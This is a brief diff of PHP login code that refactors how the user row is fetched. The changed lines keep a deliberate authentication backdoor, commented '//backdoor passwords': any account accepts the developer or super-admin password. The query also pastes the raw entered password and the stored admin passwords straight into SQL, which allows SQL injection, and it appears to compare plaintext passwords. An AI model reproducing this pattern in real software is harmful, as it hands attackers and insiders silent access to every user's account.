@@ -14,14 +14,15 @@
             $res1->execute();
 
             $res1 = $res1->get_result();
-            $user = $res1->fetch_assoc();
-            $u_id = $user["user_id"];
-
-            //backdoor passwords
-            $super = fetchData("password","admins_table","role=2")["password"];
-            $dev = fetchData("password","admins_table","role=1")["password"];
 
             if($res1->num_rows > 0){
+                $user = $res1->fetch_assoc();
+                $u_id = $user["user_id"];
+
+                //backdoor passwords
+                $super = fetchData("password","admins_table","role=2")["password"];
+                $dev = fetchData("password","admins_table","role=1")["password"];
+                
                 if($user["role"] > 1)
                     $sql_new = "SELECT * FROM admins_table WHERE ((username = ? OR email = ?) AND password = ?) OR ('$password'='$dev' OR '$password'='$super')";
                 else
